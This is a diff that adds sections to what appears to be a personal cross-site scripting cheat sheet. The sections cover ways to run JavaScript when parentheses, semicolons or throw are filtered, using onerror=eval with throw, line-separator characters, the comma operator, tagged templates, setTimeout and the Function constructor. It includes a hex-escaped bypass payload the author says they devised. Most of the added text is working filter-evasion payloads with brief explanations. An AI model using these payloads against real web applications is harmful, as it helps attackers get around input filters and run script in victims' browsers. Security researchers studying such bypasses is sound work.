@@ -205,3 +205,73 @@ throw"=alert\x28document.domain\x29";
 ```
 - We can use the above payload to execute code and `=` sign is important
 - `throw"alert\x28\x29"` will result in `Uncaught alert()` which will not pop up the alert, so we simply assign the uncaught to the alert to make it work.
+
+### Without Semicolon:
+```
+{onerror=eval}throw"=alert\x28\x29"
+
+- javascript ASI
+onerror=alert
+throw 1337
+
+- Line separator \u2028 and \u2029
+eval("onerror=\u2028alert\u2029throw 1337");
+```
+
+### Comma operartor:
+The comma (,) operator evaluates each of its operands (from left to right) and returns the value of the last operand.
+
+```
+let kabi = ('test','taxi')
+console.log(kabi) // taxi
+
+we can use this in throw, like make the expression evaluate and return the last operant from left to right.
+
+throw onerror=alert,1337
+//1337
+throw onerror=alert,1,2,3,4,5,6,7,8,9 
+// 9 
+```
+
+- `try{throw onerror=alert}catch{throw 1337}` -we can use optional variables inside catch clause.
+
+### Tagged Templates
+```
+alert`1337`
+- the above calls alert wir=th 1337
+`${alert(1)}`
+`${`${alert()}`}`
+- can use template placeholders
+```
+
+```
+eval`alert\x28\x29` // alert will not be called
+```
+- when using template strings an array of strings is passed as the first argument , the above expression will return an array.
+- But functions like timeout will convert the argument into string.
+```
+setTimeout`alert\x28\x29`
+setTimeout`alert\u0028\u0029`
+```
+```
+Function`x${'alert\x28\x29'}` //generate a function
+```
+- but it wont execute ,we need to call the function to execute.
+- In javascript ,function and Function are two different instances
+- `Function` is a built-in JavaScript object (constructor) that can dynamically create functions. It is used to create a new function object.
+- `function` is used to declare a function in javascript.
+```
+Function`x${'alert\x28\x29'}``` //call function
+```
+
+```
+onerror=alert;setTimeout`\x74\x68\x72\x6F\x77 document.domain`
+```
+- This is an working payload i just created i think and it is applicable bypass if throw and all escapes of `()` is blocked and it works on console.
+- it works on console due to setTimeout is method of window interface,hence window.onerror triggers.
+
+```
+setTimeout`alert\x28\x29`
+```
+- Instead of palceholder we can directly pass as an string to evaluate alert.
+
